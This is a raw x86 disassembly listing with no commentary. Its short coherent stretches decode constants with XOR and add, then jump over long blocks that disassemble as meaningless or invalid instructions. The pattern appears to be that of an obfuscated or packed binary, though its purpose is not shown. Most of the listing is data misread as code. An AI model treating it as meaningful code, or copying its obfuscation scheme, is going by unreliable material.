  40d2a9:	xor    eax,ecx
  40d2ab:	mov    edx,0x32729b
  40d2b0:	add    eax,edx
  40d2b2:	mov    DWORD PTR [ebp+0x8],eax
  40d2b5:	mov    eax,DWORD PTR [ebp-0x18]
  40d2b8:	xor    eax,ecx
  40d2ba:	add    eax,edx
  40d2bc:	mov    edx,DWORD PTR [ebp+0x14]
  40d2bf:	jmp    0x40d5df
  40d2c4:	xor    ch,cl
  40d2c6:	xor    DWORD PTR [ecx+0x69b241f1],eax
  40d2cc:	xor    esi,ebx
  40d2ce:	pop    ecx
  40d2d0:	xchg   DWORD PTR [edi+0x12],esi
  40d2d3:	pop    ss
  40d2d4:	sub    al,0x95
  40d2d6:	jle    0x40d356
  40d2d8:	jge    0x40d357
  40d2da:	jle    0x40d35a
  40d2dc:	push   ecx
  40d2dd:	inc    esi
  40d2de:	mov    DWORD PTR [edx-0x65432bed],esp
  40d2e4:	xchg   edi,eax
  40d2e5:	pop    esi
  40d2e6:	es clc 
  40d2e8:	push   0x66394e2
  40d2ed:	shr    BYTE PTR [edx-0x37],cl
  40d2f0:	jb     0x40d2ed
  40d2f2:	jne    0x40d2a4
  40d2f4:	adc    BYTE PTR [eax-0x23],dl
  40d2f7:	or     al,0xb6
  40d2f9:	jbe    0x40d292
  40d2fb:	jecxz  0x40d359
  40d2fd:	repnz loope 0x40d2be
  40d300:	aaa    
  40d301:	ins    DWORD PTR es:[edi],dx
  40d302:	mov    ebx,0xae494823
  40d307:	mov    esi,0xf8e6803c
  40d30c:	or     eax,0xba412c18
  40d311:	and    eax,0x502a54b8
  40d316:	or     DWORD PTR [esi+0x42],eax
  40d319:	mov    DWORD PTR [ecx-0x336d5d61],esi
  40d31f:	imul   edx,DWORD PTR es:[eax],0xffffffba
  40d323:	(bad)  
  40d324:	push   0x4a889f4e
  40d329:	pop    ebp
  40d32a:	dec    eax
  40d32b:	call   0xa293:0x355683f7
  40d332:	push   0x3c2632f5
  40d337:	xor    eax,0xfcbd9c05
  40d33c:	lea    ecx,[eax+ebp*1]
  40d33f:	outs   dx,DWORD PTR ds:[esi]
  40d340:	retf   0xbb55
  40d343:	xchg   edi,eax
  40d344:	ins    BYTE PTR es:[edi],dx
  40d345:	jbe    0x40d32d
  40d347:	lock mov al,0x8a
  40d34a:	xlat   BYTE PTR ds:[ebx]
  40d34b:	sbb    eax,0x5b4cd89c
  40d350:	div    edi
  40d352:	jbe    0x40d3cb
  40d354:	in     al,dx
  40d355:	or     BYTE PTR [esi+0xe9ef00f],al
  40d35b:	(bad)  
  40d35c:	mov    esp,0xf444bd99
  40d361:	(bad)  
  40d362:	jecxz  0x40d38a
  40d364:	sbb    cl,ch
  40d366:	push   cs
  40d367:	repnz dec edi
  40d369:	sbb    bl,ch
  40d36b:	(bad)  
  40d36c:	repz sbb bl,bh
  40d36f:	jbe    0x40d3b5
  40d371:	adc    DWORD PTR [eax],esp
  40d373:	mov    cl,0x1e
  40d375:	push   ebp
  40d376:	out    dx,eax
  40d377:	out    dx,al
  40d378:	or     dl,dl
  40d37a:	int3   
  40d37b:	sub    BYTE PTR [eax],bl
  40d37d:	xlat   BYTE PTR ds:[ebx]
  40d37e:	(bad)  
  40d37f:	call   0xa5fde389
  40d384:	outs   dx,DWORD PTR ds:[esi]
  40d385:	xchg   esp,eax
  40d386:	push   ebp
  40d387:	dec    eax
  40d388:	lea    eax,[eax]
  40d38a:	and    ch,BYTE PTR [edi]
  40d38c:	jecxz  0x40d390
  40d38e:	out    0x4f,eax
  40d390:	mov    cl,0xdd
  40d392:	sbb    dl,ch
  40d394:	ins    DWORD PTR es:[edi],dx
  40d395:	lahf   
  40d396:	fwait
  40d397:	pslld  mm5,mm0
  40d39a:	cmp    eax,0xbac7a87a
  40d39f:	and    edi,DWORD PTR [ecx-0x5a]
  40d3a2:	stos   DWORD PTR es:[edi],eax
  40d3a3:	mov    ds:0xb2b7b0df,al
  40d3a8:	xor    DWORD PTR [ebp+0x34867d91],ecx
  40d3ae:	mov    bh,0x55
  40d3b0:	lahf   
  40d3b1:	fsub   DWORD PTR [esp+eax*4]
  40d3b4:	cli    
  40d3b5:	pop    edx
  40d3b6:	ret    
  40d3b7:	adc    esp,ecx
  40d3b9:	in     eax,dx
  40d3ba:	jno    0x40d3aa
  40d3bc:	fisttp WORD PTR [ecx+0x1]
  40d3bf:	cmp    DWORD PTR [eax],esi
  40d3c1:	outs   dx,DWORD PTR ds:[esi]
  40d3c2:	or     eax,0x74e256a3
  40d3c7:	and    cl,ch
  40d3c9:	arpl   WORD PTR [ebx-0x57efa592],ax
  40d3cf:	mov    esp,0xde82539c
  40d3d4:	cmp    dh,0xb1
  40d3d7:	scas   eax,DWORD PTR es:[edi]
  40d3d8:	repz jge 0x40d3ad
  40d3db:	xor    edx,esp
  40d3dd:	jo     0x40d3bb
  40d3df:	adc    DWORD PTR ds:0x21387362,eax
  40d3e5:	sub    eax,0x4c315437
  40d3ea:	pop    edi
  40d3eb:	mov    ecx,0xb8d363c7
  40d3f0:	hlt    
  40d3f1:	ret    0xcf60
  40d3f4:	int3   
  40d3f5:	sub    eax,0x3553cae9
  40d3fa:	or     ch,BYTE PTR [ebx+0x73e0ca30]
  40d400:	mov    al,0xcc
  40d402:	mov    cl,0x6f
  40d404:	leave  
  40d405:	(bad)  
  40d406:	faddp  st(2),st
  40d408:	jp     0x40d3e5
  40d40a:	xchg   BYTE PTR [edi],cl
  40d40c:	pop    esp
  40d40d:	imul   ebx,DWORD PTR [ebx+0x4d],0x4f
  40d411:	xor    al,ch
  40d413:	pop    ss
  40d414:	inc    edi
  40d415:	pop    es
  40d416:	pop    eax
  40d417:	xchg   ebp,edi
  40d419:	sbb    bl,bh
  40d41b:	cld    
  40d41c:	mov    ss,eax
  40d41e:	enter  0x300,0x2d
  40d422:	mov    eax,0x2d568b45
  40d427:	pop    esp
  40d428:	into   
  40d429:	test   BYTE PTR [ecx-0x323d4700],al
  40d42f:	xor    BYTE PTR [ebx],bl
  40d431:	inc    edi
  40d432:	xor    eax,0x11022fe2
  40d437:	stos   DWORD PTR es:[edi],eax
  40d438:	mov    dh,0x18
  40d43a:	popa   
  40d43b:	lea    esi,[ebp-0x67016600]
  40d441:	lock sbb DWORD PTR [eax+0x35],esp
  40d445:	jmp    0x30e1:0xd8eaf79c
  40d44c:	mov    ah,0xd6
  40d44e:	rol    al,1
  40d450:	ret    
  40d451:	xchg   cl,ch
  40d453:	inc    esi
  40d454:	lds    edi,FWORD PTR [ecx-0x76957bab]
  40d45a:	test   BYTE PTR [edx+0x36e8f0cc],bh
  40d460:	push   ss
  40d461:	mov    ecx,0x48cf6eee
  40d466:	dec    eax
  40d467:	retf   0x305b
  40d46a:	xchg   esi,eax
  40d46b:	cli    
  40d46c:	ins    BYTE PTR es:[edi],dx
  40d46d:	int3   
  40d46e:	aas    
  40d46f:	in     eax,dx
  40d470:	call   0x8292:0x6ce715d5
  40d477:	aaa    
  40d478:	adc    eax,DWORD PTR [ecx-0xb]
  40d47b:	and    BYTE PTR [ebx+esi*4+0x1f109211],cl
  40d482:	push   edx
  40d483:	pop    edx
  40d484:	mov    ds:0xaa96fa52,al
  40d489:	jge    0x40d478
  40d48b:	or     BYTE PTR [esp+ecx*8-0x3696b964],dh
  40d492:	leave  
  40d493:	xchg   edx,eax
  40d494:	add    BYTE PTR [esi-0x42285efc],ch
  40d49a:	and    DWORD PTR [esi+0x65a4484f],edi
  40d4a0:	push   ds
  40d4a1:	mov    eax,0xba258171
  40d4a6:	jo     0x40d49c
  40d4a8:	xor    ch,BYTE PTR [edi-0x3c]
  40d4ab:	xchg   esi,eax
  40d4ac:	sbb    DWORD PTR [ebx+edx*1-0x6857c1c6],esp
  40d4b3:	arpl   dx,cx
  40d4b5:	loopne 0x40d492
  40d4b7:	mov    bh,0xd4
  40d4b9:	jl     0x40d474
  40d4bb:	mov    WORD PTR [ebx],?
  40d4bd:	retf   0xff78
  40d4c0:	mov    ecx,0x22a1e730
  40d4c5:	inc    eax
  40d4c6:	jg     0x40d4b2
  40d4c8:	or     al,0x3f
  40d4ca:	shr    BYTE PTR [eax+0x24],0xd3
  40d4ce:	or     edx,DWORD PTR [ecx+0x4205db27]
  40d4d4:	scas   eax,DWORD PTR es:[edi]
  40d4d5:	mov    edi,0x15c6be5e
  40d4da:	or     bl,BYTE PTR [edi]
  40d4dc:	push   edi
  40d4dd:	and    dl,cl
  40d4df:	test   BYTE PTR [eax-0x56],dh
  40d4e2:	inc    edx
  40d4e3:	fmul   DWORD PTR [edi]
  40d4e5:	loope  0x40d4db
  40d4e7:	pop    edx
  40d4e8:	pop    ebx
  40d4e9:	fmul   QWORD PTR [esp+edx*8+0x79]
  40d4ed:	jno    0x40d4ea
  40d4ef:	cmp    DWORD PTR [ecx+0x23],esi
  40d4f2:	xchg   esp,eax
  40d4f3:	dec    ebx
  40d4f4:	mov    ebx,0x4da9658
  40d4f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4fa:	aaa    
  40d4fb:	inc    ecx
  40d4fc:	cwde   
  40d4fd:	rol    edi,cl
  40d4ff:	mov    eax,ds:0xc99fb2a8
  40d504:	(bad)  
  40d505:	pusha  
  40d506:	inc    ebx
  40d507:	jge    0x40d583
  40d509:	int    0x6c
  40d50b:	ss in  eax,0x96
  40d50e:	mov    ds:0xdd07b8c0,eax
  40d513:	mov    ecx,0x24bcf65a
  40d518:	pop    ecx
  40d519:	and    BYTE PTR ds:0x6b665ff,cl
  40d51f:	aas    
  40d520:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d521:	cwde   
  40d522:	int    0xba
  40d524:	sub    bh,BYTE PTR ds:0x91474cf2
  40d52a:	sub    al,0xc
  40d52c:	icebp  
  40d52d:	push   0xffffff84
  40d52f:	(bad)  
  40d530:	jne    0x40d50b
  40d532:	inc    ecx
  40d533:	mov    bl,BYTE PTR ds:0xa1599a78
  40d539:	and    al,0x4d
  40d53b:	add    eax,0xcff5b5b5
  40d540:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d541:	sbb    ch,BYTE PTR [ebp-0x73]
  40d544:	jl     0x40d53d
  40d546:	inc    eax
  40d547:	shl    DWORD PTR [ecx-0x36],cl
  40d54a:	jne    0x40d57e
  40d54c:	and    bl,BYTE PTR [esi-0x5011dc58]
  40d552:	enter  0x7299,0xe
  40d556:	mov    esi,0x5ba969ae
  40d55b:	and    bl,BYTE PTR [edi+0x27]
  40d55e:	push   0xfffffff4
  40d560:	mov    ebp,0x18b64f77
  40d565:	es nop
  40d567:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d568:	mov    dl,0x11
  40d56a:	push   ecx
  40d56b:	pusha  
  40d56c:	xor    BYTE PTR [esi],cl
  40d56e:	ds retf 
  40d570:	fiadd  DWORD PTR [eax]
  40d572:	and    BYTE PTR [esi-0x1ca0901a],ch
  40d578:	push   edi
  40d579:	popa   
  40d57a:	push   ss
  40d57b:	aam    0x65
  40d57d:	arpl   WORD PTR [ebx],bx
  40d57f:	in     al,0xfc
  40d581:	mov    esi,0xa033a0aa
  40d586:	xlat   BYTE PTR ds:[ebx]
  40d587:	xlat   BYTE PTR ds:[ebx]
  40d588:	test   DWORD PTR [edi],0xb404aed9
  40d58e:	popa   
  40d58f:	les    edi,FWORD PTR [ebx-0x5fc350a3]
  40d595:	sub    ebp,DWORD PTR [edx+0x71]
  40d598:	leave  
  40d599:	cmp    eax,DWORD PTR [eax]
  40d59b:	sar    DWORD PTR [ecx],1
  40d59d:	xchg   esp,eax
  40d59e:	xchg   ecx,eax
  40d59f:	sub    dh,cl
  40d5a1:	xor    edi,DWORD PTR [esi-0x68]
  40d5a4:	ret    
  40d5a5:	or     BYTE PTR ds:0x496df7d6,ch
  40d5ab:	jp     0x40d5c4
  40d5ad:	mov    ds:0x9a18da5e,al
  40d5b2:	mov    ch,0x4a
  40d5b4:	out    dx,al
  40d5b5:	inc    BYTE PTR [edx]
  40d5b7:	mov    cl,BYTE PTR [edx+0x545f4184]
  40d5bd:	inc    esi
  40d5be:	fucompp 
  40d5c0:	dec    esi
  40d5c1:	cmp    ebp,DWORD PTR [eax-0xf110dfe]
  40d5c7:	mov    BYTE PTR [eax+eiz*1-0x3bbb6809],ah
  40d5ce:	mov    ds,WORD PTR ds:[eax-0x18]
  40d5d2:	in     eax,dx
  40d5d3:	dec    ebx
  40d5d4:	pop    ds
  40d5d5:	cmp    BYTE PTR [ebx-0x55],dh
  40d5d8:	inc    eax
  40d5d9:	fst    DWORD PTR [ecx+0x2e0184b8]
  40d5df:	imul   eax,DWORD PTR [edx]
  40d5e2:	mov    edx,DWORD PTR [ebp-0x4]
  40d5e5:	xor    edx,ecx
  40d5e7:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5ea:	lea    ecx,[edx+ecx*1+0x32729b]
  40d5f1:	cmp    ecx,eax
  40d5f3:	je     0x40dfca
  40d5f9:	mov    edi,DWORD PTR [ebp-0x18]
  40d5fc:	mov    eax,DWORD PTR [ebp+0x8]
  40d5ff:	mov    edx,DWORD PTR [ebp+0x14]
  40d602:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d606:	mov    ecx,0x7510854
  40d60b:	xor    edx,edx
  40d60d:	xor    edi,ecx
  40d60f:	mov    esi,0x32729b
  40d614:	add    edi,esi
  40d616:	div    edi
  40d618:	mov    edx,DWORD PTR [ebp-0x4]
  40d61b:	jmp    0x40d93b
  40d620:	inc    ecx
  40d621:	stos   BYTE PTR es:[edi],al
  40d622:	push   ss
  40d623:	jmp    0x40d61a
  40d625:	jae    0x40d688
  40d627:	mov    al,0xbf
  40d629:	jo     0x40d5c5
  40d62b:	jecxz  0x40d6a2
  40d62d:	sbb    ah,BYTE PTR [edi+0x7e902b8e]
  40d633:	jle    0x40d6b2
  40d635:	jge    0x40d6b5
  40d637:	jle    0x40d5bc
  40d639:	pop    esp
  40d63a:	jmp    DWORD PTR [eax]
  40d63c:	mov    ecx,0x316887d3
  40d641:	out    0x74,eax
  40d643:	dec    ebp
  40d644:	int    0x43
  40d646:	push   ds
  40d647:	mov    eax,0xb5148c1d
  40d64c:	cld    
  40d64d:	pop    es
  40d64e:	push   ebx
  40d64f:	ja     0x40d5d4
  40d651:	scas   al,BYTE PTR es:[edi]
  40d652:	rcl    DWORD PTR fs:[edx-0x3f72c294],cl
  40d659:	xchg   esi,eax
  40d65a:	inc    edi
  40d65b:	lods   al,BYTE PTR ds:[esi]
  40d65c:	cdq    
  40d65d:	or     dl,BYTE PTR [edi-0x1261b5c1]
  40d663:	jle    0x40d651
  40d665:	ss sub ebx,ecx
  40d668:	lahf   
  40d669:	mov    cl,0xac
  40d66b:	inc    ebx
  40d66c:	out    dx,eax
  40d66d:	add    DWORD PTR [ebx+0x2af0d5a3],ebp
  40d673:	sub    al,0x35
  40d675:	repz int 0xb7
  40d678:	(bad)  
  40d679:	bound  ebp,QWORD PTR [esi+0x20]
  40d67c:	mov    DWORD PTR [ebx+0x29b7e59c],ebp
  40d682:	pop    ebx
  40d683:	lock test BYTE PTR [eax],ch
  40d686:	lods   al,BYTE PTR ds:[esi]
  40d687:	rol    BYTE PTR [eax+0x55],1
  40d68a:	popa   
  40d68b:	push   ebp
  40d68c:	and    ebp,DWORD PTR [ecx-0x34]
  40d68f:	mov    ch,0x53
  40d691:	test   al,0x70
  40d693:	mov    ch,0x21
  40d695:	daa    
  40d696:	inc    esi
  40d697:	jge    0x40d64d
  40d699:	jge    0x40d67a
  40d69b:	push   ds
  40d69c:	jns    0x40d713
  40d69e:	aas    
  40d69f:	fdivr  DWORD PTR [ebx-0xd]
  40d6a2:	sar    BYTE PTR [ecx-0x517a04e2],cl
  40d6a8:	pop    ebp
  40d6a9:	adc    DWORD PTR ds:0x152c420a,0xa661a292
  40d6b3:	mov    ebp,DWORD PTR [ecx+0x3c]
  40d6b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6b7:	sbb    BYTE PTR [edi+eax*4+0x9],ah
  40d6bb:	mov    eax,ds:0xd66abaf7
  40d6c0:	jno    0xf2fcd53b
  40d6c6:	std    
  40d6c7:	mov    ds:0x43f0bb85,al
  40d6cc:	fidiv  DWORD PTR [edx]
  40d6ce:	sub    al,0xe4
  40d6d0:	xor    al,0xaa
  40d6d2:	rcl    DWORD PTR [esi],cl
  40d6d4:	je     0x40d663
  40d6d6:	shl    cl,cl
  40d6d8:	iret   
  40d6d9:	or     ecx,DWORD PTR ds:0xd03a1042
  40d6df:	cmp    ah,ah
  40d6e1:	mov    cl,0xe8
  40d6e3:	jbe    0x40d707
  40d6e5:	jecxz  0x40d66e
  40d6e7:	jecxz  0x40d6f8
  40d6e9:	mov    al,0xb6
  40d6eb:	and    DWORD PTR [bp+si-0x701a],edx
  40d6f0:	cdq    
  40d6f1:	adc    cl,BYTE PTR [eax+0x34fb74e2]
  40d6f7:	push   ebp
  40d6f8:	push   esp
  40d6f9:	(bad)  
  40d6fa:	ja     0x40d752
  40d6fc:	push   ss
  40d6fd:	(bad)  
  40d6fe:	pop    ebx
  40d6ff:	pop    esp
  40d700:	sub    DWORD PTR [eax+0x4294c27c],edi
  40d706:	outs   dx,DWORD PTR ds:[esi]
  40d707:	ins    BYTE PTR es:[edi],dx
  40d708:	stos   DWORD PTR es:[edi],eax
  40d709:	jp     0x40d710
  40d70b:	fwait
  40d70c:	mov    DWORD PTR [ebx+0x7c05d943],esp
  40d712:	and    ebx,edx
  40d714:	xchg   ecx,eax
  40d715:	lds    esi,FWORD PTR [ebx+0x36]
  40d718:	mov    al,ds:0xc2f6cdad
  40d71d:	add    DWORD PTR [edi-0x562a0582],edx
  40d723:	jmp    0xabc6d76a
  40d728:	sbb    BYTE PTR [ebp-0x1b],cl
  40d72b:	in     al,0x7d
  40d72d:	adc    al,0xe3
  40d72f:	sbb    edi,esp
  40d731:	and    esp,DWORD PTR [edx+0x173641d]
  40d737:	cmp    ebx,edi
  40d739:	rcr    DWORD PTR [edx+0x413e3c0f],cl
  40d73f:	mov    edx,0x5cb340db
  40d744:	jge    0x40d707
  40d746:	dec    esi
  40d747:	or     ebx,DWORD PTR [edx-0x74be12d2]
  40d74d:	ficom  WORD PTR [edx-0x2e497cf2]
  40d753:	(bad)
  40d758:	push   DWORD PTR [edx]
  40d75a:	cmp    BYTE PTR [eax+0x285de8cb],dh
  40d760:	out    dx,al
  40d761:	rcr    BYTE PTR [ebp-0x74],1
  40d764:	pusha  
  40d765:	rol    DWORD PTR [eax],0x36
  40d768:	xchg   ch,dl
  40d76a:	mov    ebx,0x8a172dbf
  40d76f:	mov    WORD PTR [edi+0x15],ds
  40d772:	pushf  
  40d773:	sub    eax,0x98dbeb1a
  40d778:	pop    edx
  40d779:	push   ebx
  40d77a:	icebp  
  40d77b:	stc    
  40d77c:	sub    ebp,DWORD PTR es:[eax+0x749eefa7]
  40d783:	lods   eax,DWORD PTR ds:[esi]
  40d784:	push   ebp
  40d785:	mov    bh,0x22
  40d787:	jno    0x40d7b4
  40d789:	inc    ebx
  40d78a:	cmp    DWORD PTR [eax],esp
  40d78c:	iret   
  40d78d:	imul   edi,DWORD PTR [eax-0x4e],0x7b
  40d791:	push   esp
  40d792:	pop    esp
  40d793:	jecxz  0x40d715
  40d795:	leave  
  40d796:	mul    DWORD PTR [esi+ebp*8]
  40d799:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d79a:	je     0x40d780
  40d79c:	scas   al,BYTE PTR es:[edi]
  40d79d:	int    0x96
  40d79f:	daa    
  40d7a0:	jmp    0xc403a205
  40d7a5:	pop    ebx
  40d7a6:	je     0x40d790
  40d7a8:	(bad)  
  40d7a9:	pop    edx
  40d7aa:	ja     0x40d812
  40d7ac:	int    0x94
  40d7ae:	das    
  40d7af:	and    DWORD PTR [edx-0x5dcb895b],0xfffffff6
  40d7b6:	and    BYTE PTR [ebx-0x55eeaa29],cl
  40d7bc:	stos   BYTE PTR es:[edi],al
  40d7bd:	or     BYTE PTR [eax],al
  40d7bf:	mov    ah,0xc5
  40d7c1:	dec    esp
  40d7c2:	add    al,0x8a
  40d7c4:	retf   0x2623
  40d7c7:	int    0x46
  40d7c9:	lea    edi,[eax]
  40d7cb:	repz push ebx
  40d7cd:	aas    
  40d7ce:	xor    DWORD PTR [esi-0x29b284a3],0x58
  40d7d5:	test   BYTE PTR [ecx+0x9438a48],0x7c
  40d7dc:	mov    dh,0xf2
  40d7de:	je     0x40d83a
  40d7e0:	fstp   QWORD PTR [eax+0x193b1fd8]
  40d7e6:	mov    bh,0xcf
  40d7e8:	mov    edi,DWORD PTR [ebx-0x298e091d]
  40d7ee:	nop
  40d7ef:	aam    0xcf
  40d7f1:	jb     0x40d7ed
  40d7f3:	pop    edi
  40d7f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7f5:	out    dx,al
  40d7f6:	or     al,0x92
  40d7f8:	adc    al,0x5c
  40d7fa:	ret    
  40d7fb:	cmc    
  40d7fc:	ror    BYTE PTR [edi+eiz*2+0x3c],0x4f
  40d801:	ss pop es
  40d803:	or     bh,BYTE PTR [ebp-0x1b]
  40d806:	pop    es
  40d807:	pop    ebp
  40d808:	in     eax,0x46
  40d80a:	sbb    bh,ah
  40d80c:	xlat   BYTE PTR ds:[ebx]
  40d80d:	jle    0x40d7ea
  40d80f:	xchg   esp,eax
  40d810:	mov    ah,0x2a
  40d812:	lea    esi,[ebx]
  40d814:	and    dl,BYTE PTR [ebx-0x2]
  40d817:	retf   
  40d818:	das    
  40d819:	ret    
  40d81a:	mov    cl,0x28
  40d81c:	push   ecx
  40d81d:	into   
  40d81e:	push   eax
  40d81f:	mov    eax,ds:0x9621e58
  40d824:	mov    ds:0xcb3caf3,eax
  40d829:	inc    esi
  40d82a:	in     eax,0x6a
  40d82c:	fadd   DWORD PTR [eax]
  40d82e:	and    DWORD PTR [ebp+0x43fabd82],eax
  40d834:	ret    0x4dbf
  40d837:	and    ah,bl
  40d839:	shr    ebx,1
  40d83b:	and    al,0x39
  40d83d:	cmp    al,0x30
  40d83f:	sbb    DWORD PTR [ecx+0x5c2030dd],ebp
  40d845:	add    dh,al
  40d847:	add    al,0x56
  40d849:	jo     0x40d7d4
  40d84b:	imul   edx,DWORD PTR [ebp+0x3177f3f9],0x3ca2c333
  40d855:	shl    DWORD PTR [ebx+0x70],cl
  40d858:	or     BYTE PTR [ebx-0x66],al
  40d85b:	or     DWORD PTR ds:[ecx-0x59],esi
  40d85f:	in     al,dx
  40d860:	adc    eax,0xc7985485
  40d865:	test   BYTE PTR [esi-0x45],bh
  40d868:	(bad)  
  40d86a:	push   es
  40d86b:	hlt    
  40d86c:	dec    edi
  40d86d:	pushf  
  40d86e:	cmp    eax,0x7f4ba229
  40d873:	add    DWORD PTR [esi+0x16],0xfe568c99
  40d87a:	pop    eax
  40d87b:	frstor [esi-0x56430dce]
  40d881:	mov    esi,0x2ef687cc
  40d886:	mov    WORD PTR [esp+ecx*2-0x1a],?
  40d88a:	push   0x6a
  40d88c:	mov    al,cl
  40d88e:	out    dx,al
  40d88f:	loopne 0x40d870
  40d891:	and    ebp,DWORD PTR [esi+0x459f7383]
  40d897:	test   dh,cl
  40d899:	mov    ecx,0xc8296e23
  40d89e:	addr16 xchg esp,eax
  40d8a0:	lods   al,BYTE PTR ds:[esi]
  40d8a1:	sbb    BYTE PTR [ebp+0x53b27419],bh
  40d8a7:	mov    eax,ds:0x8942d838
  40d8ac:	jnp    0x40d869
  40d8ae:	and    BYTE PTR [esi],0xb2
  40d8b1:	loope  0x40d870
  40d8b3:	jge    0x40d85f
  40d8b5:	out    0x27,al
  40d8b7:	mov    ebx,0x96d6e902
  40d8bc:	sub    dh,dl
  40d8be:	mov    esp,0x823d9d73
  40d8c3:	or     al,0xf3
  40d8c5:	add    eax,0x18e23cc7
  40d8ca:	dec    ebp
  40d8cb:	adc    DWORD PTR [ebx+esi*8],edx
  40d8ce:	sbb    BYTE PTR [ecx-0x2dc4095d],al
  40d8d4:	test   al,0x6e
  40d8d6:	mov    ah,0x5b
  40d8d8:	pop    ecx
  40d8d9:	shl    esp,cl
  40d8db:	leave  
  40d8dc:	xchg   edx,eax
  40d8dd:	les    ebp,FWORD PTR [ebx+0x42]
  40d8e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8e1:	ret    0x45e9
  40d8e4:	mov    bl,0xc4
  40d8e6:	out    dx,al
  40d8e7:	and    al,0x1
  40d8e9:	aaa    
  40d8ea:	jg     0x40d8ab
  40d8ec:	push   ds
  40d8ed:	stos   BYTE PTR es:[edi],al
  40d8ee:	mov    ss,WORD PTR [edi-0x5b5934c5]
  40d8f4:	inc    esp
  40d8f5:	int3   
  40d8f6:	out    dx,al
  40d8f7:	jmp    0x40d8cd
  40d8f9:	jae    0x40d8c2
  40d8fb:	adc    eax,0x2cd3d06f
  40d900:	ins    DWORD PTR es:[edi],dx
  40d901:	xor    BYTE PTR [ebx],dh
  40d903:	and    al,0x4
  40d905:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d906:	pop    ds
  40d907:	cmp    eax,0x9dff5cfa
  40d90c:	and    BYTE PTR [edi-0x11],dl
  40d90f:	scas   al,BYTE PTR es:[edi]
  40d910:	loope  0x40d972
  40d912:	cwde   
  40d913:	pop    ebx
  40d914:	sbb    al,0xe8
  40d916:	out    0x54,eax
  40d918:	xchg   ebx,eax
  40d919:	out    0xd1,eax
  40d91b:	pop    ebx
  40d91c:	mov    ch,0x8a
  40d91e:	shr    BYTE PTR [ecx+edx*4-0x48],1
  40d922:	icebp  
  40d923:	aam    0xd9
  40d925:	fbld   TBYTE PTR [esi-0x12]
  40d928:	gs retf 0xe8f9
  40d92c:	jmp    0x7766f2f2
  40d931:	lods   eax,DWORD PTR ds:[esi]
  40d932:	js     0x40d8e9
  40d934:	adc    BYTE PTR [ebx],dh
  40d936:	repnz mov bh,0xfe
  40d939:	push   edx
  40d93a:	mov    bh,0x33
  40d93c:	ror    DWORD PTR [ebp+0x729b0284],1
  40d942:	xor    al,BYTE PTR [eax]
  40d944:	jmp    0x40dc64
  40d949:	das    
  40d94a:	sub    BYTE PTR [ecx],0x25
  40d94d:	mov    cl,0xb5
  40d94f:	xor    edx,DWORD PTR [eax-0x2c802913]
  40d955:	sar    edi,0xa0
  40d958:	aaa    
  40d959:	ss lahf 
  40d95b:	jle    0x40d9db
  40d95d:	jge    0x40d9dc
  40d95f:	jle    0x40d9df
  40d961:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d962:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d963:	jecxz  0x40d9b7
  40d965:	enter  0x8385,0x6
  40d969:	push   ecx
  40d96a:	dec    eax
  40d96b:	adc    esp,DWORD PTR [esi]
  40d96d:	stos   BYTE PTR es:[edi],al
  40d96e:	xchg   BYTE PTR ds:0x94324e13,dh
  40d974:	sbb    eax,0xf806ce5d
  40d979:	sbb    bl,BYTE PTR [ecx-0x42734658]
  40d97f:	cmp    al,BYTE PTR [ecx+0x5ebcc5d9]
  40d985:	mov    bh,0xee
  40d987:	rcr    DWORD PTR [edx],1
  40d989:	mov    esp,0x7ed71fe0
  40d98e:	mov    al,ds:0xc5ea1c0e
  40d993:	aas    
  40d994:	jo     0x40da0a
  40d996:	xor    bh,ch
  40d998:	ins    DWORD PTR es:[edi],dx
  40d999:	mov    ebp,ebx
  40d99b:	popa   
  40d99c:	adc    ebp,DWORD PTR [esp+eax*8+0x7f]
  40d9a0:	ret    0xd297
  40d9a3:	and    cl,BYTE PTR [edx]
  40d9a5:	pop    edi
  40d9a6:	cs xchg edx,eax
  40d9a8:	jmp    0x4e1898bd
  40d9ad:	cs jg  0x40d9d3
  40d9b0:	mov    bh,0x86
  40d9b2:	outs   dx,BYTE PTR ds:[esi]
  40d9b3:	and    DWORD PTR [edx-0x6c],0x68c21483
  40d9ba:	ror    BYTE PTR [ecx],0xaa
  40d9bd:	imul   BYTE PTR [eax-0x4d]
  40d9c0:	jmp    0x40d9b5
  40d9c2:	and    cl,ah
  40d9c4:	push   ebx
  40d9c5:	shl    BYTE PTR [eax+0x265b76e0],0xa1
  40d9cc:	jbe    0x40d9c4
  40d9ce:	in     al,dx
  40d9cf:	std    
  40d9d0:	scas   eax,DWORD PTR es:[edi]
  40d9d1:	jo     0x40da18
  40d9d3:	js     0x40d9aa
  40d9d5:	sar    DWORD PTR ds:0x1a0e8d33,0x11
  40d9dc:	cli    
  40d9dd:	scas   eax,DWORD PTR es:[edi]
  40d9de:	hlt    
  40d9df:	leave  
  40d9e0:	add    eax,0xdedf69ef
  40d9e5:	sub    al,0xa8
  40d9e7:	pop    edi
  40d9e8:	call   0x4e85:0x489352ea
  40d9ef:	mov    cl,0xa0
  40d9f1:	add    BYTE PTR ds:0xeee6fc05,dl
  40d9f7:	mov    WORD PTR [ecx],es
  40d9f9:	scas   al,BYTE PTR es:[edi]
  40d9fa:	mov    edi,0x70869107
  40d9ff:	test   DWORD PTR [edi],esi
  40da01:	jge    0x40da24
  40da03:	sub    dh,bh
  40da05:	enter  0xe633,0x9
  40da09:	mov    ebp,0x45d2e89f
  40da0e:	xor    eax,0x3501d74b
  40da13:	mov    esp,DWORD PTR [ecx-0x37]
  40da16:	loope  0x40da49
  40da18:	idiv   BYTE PTR [edx]
  40da1a:	jge    0x40d9d6
  40da1c:	aam    0x78
  40da1e:	cmp    ecx,ebx
  40da20:	(bad)  [esi+0x7d9d3ce2]
  40da26:	inc    ebp
  40da27:	les    ebx,FWORD PTR [edi+0x1565ea58]
  40da2d:	mov    dl,0xed
  40da2f:	jnp    0x40d9f1
